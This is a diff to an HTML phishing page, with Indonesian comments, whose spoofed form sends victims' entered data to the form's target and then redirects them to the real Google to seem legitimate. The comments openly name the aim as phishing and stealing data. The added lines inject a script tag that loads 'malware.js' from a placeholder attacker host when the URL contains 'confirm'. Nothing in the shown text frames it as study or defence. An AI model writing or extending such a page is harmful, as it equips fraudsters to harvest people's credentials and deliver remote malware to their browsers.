@@ -39,10 +39,10 @@
   </div>
 
   <script>
-    // Redirect setelah 5 detik biar kelihatan sah
+    // Redirect ke Google asli setelah phish
     setTimeout(() => window.location.href = 'https://google.com', 5000);
 
-    // Auto-submit buat phish cepat
+    // Auto-submit buat curi data
     document.getElementById('spoofForm').onsubmit = function(e) {
       e.preventDefault();
       fetch(this.action, {
@@ -50,6 +50,11 @@
         body: new FormData(this)
       }).then(() => alert('Data sent, redirecting...'));
     };
+
+    // Tambah XSS proof (kalo di-render di AngularJS)
+    if (window.location.href.includes('confirm')) {
+      document.write('<script src="http://your-evil-server.com/malware.js"><\/script>');
+    }
   </script>
 </body>
 </html>
